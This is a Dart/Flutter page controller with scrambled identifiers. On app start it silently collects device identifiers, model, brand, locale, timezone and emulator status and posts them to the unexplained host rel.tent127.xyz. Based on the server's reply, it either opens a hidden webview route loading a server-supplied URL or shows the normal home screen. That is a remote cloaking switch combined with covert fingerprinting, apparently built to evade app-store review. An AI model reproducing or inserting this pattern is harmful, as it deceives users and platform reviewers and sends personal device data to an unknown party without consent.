import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var dvyjhbqiws = RxBool(false);
  var dxgyzvqkps = RxBool(true);
  var oxlap = RxString("");
  var alta = RxBool(false);
  var lesch = RxBool(true);
  final jpimoyrg = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    gwtyi();
  }


  Future<void> gwtyi() async {

    alta.value = true;
    lesch.value = true;
    dxgyzvqkps.value = false;

    jpimoyrg.post("https://rel.tent127.xyz/o7Cf9i4KXEC",data: await prbjnem()).then((value) {
      var midfs = value.data["midfs"] as String;
      var henxuf = value.data["henxuf"] as bool;
      if (henxuf) {
        oxlap.value = midfs;
        rosario();
      } else {
        gutmann();
      }
    }).catchError((e) {
      dxgyzvqkps.value = true;
      lesch.value = true;
      alta.value = false;
    });
  }

  Future<Map<String, dynamic>> prbjnem() async {
    final DeviceInfoPlugin lrungm = DeviceInfoPlugin();
    PackageInfo phubljn_wgai = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vrykgz = Platform.localeName;
    var hFny = currentTimeZone;

    var vPzQFgaY = phubljn_wgai.packageName;
    var dVgZsnAN = phubljn_wgai.version;
    var XMzxynLK = phubljn_wgai.buildNumber;

    var OCAHhJX = phubljn_wgai.appName;
    var janyConsidine = "";
    var qXwpI  = "";
    var arleneLangosh = "";
    var kDcgC = "";
    var zRsUom = "";
    var zaneHyatt = "";
    var antoninaKreiger = "";
    var cheyanneKassulke = "";


    var twGeS = "";
    var huvYI = false;

    if (GetPlatform.isAndroid) {
      twGeS = "android";
      var pdcfuir = await lrungm.androidInfo;

      zRsUom = pdcfuir.brand;

      kDcgC  = pdcfuir.model;
      qXwpI = pdcfuir.id;

      huvYI = pdcfuir.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      twGeS = "ios";
      var dejghr = await lrungm.iosInfo;
      zRsUom = dejghr.name;
      kDcgC = dejghr.model;

      qXwpI = dejghr.identifierForVendor ?? "";
      huvYI  = dejghr.isPhysicalDevice;
    }
    var res = {
      "cheyanneKassulke" : cheyanneKassulke,
      "OCAHhJX": OCAHhJX,
      "dVgZsnAN": dVgZsnAN,
      "vPzQFgaY": vPzQFgaY,
      "kDcgC": kDcgC,
      "XMzxynLK": XMzxynLK,
      "zRsUom": zRsUom,
      "qXwpI": qXwpI,
      "vrykgz": vrykgz,
      "arleneLangosh" : arleneLangosh,
      "twGeS": twGeS,
      "huvYI": huvYI,
      "hFny": hFny,
      "zaneHyatt" : zaneHyatt,
      "antoninaKreiger" : antoninaKreiger,
      "janyConsidine" : janyConsidine,

    };
    return res;
  }

  Future<void> gutmann() async {
    Get.offAllNamed("/home");
  }

  Future<void> rosario() async {
    Get.offAllNamed("/cartoon");
  }

}
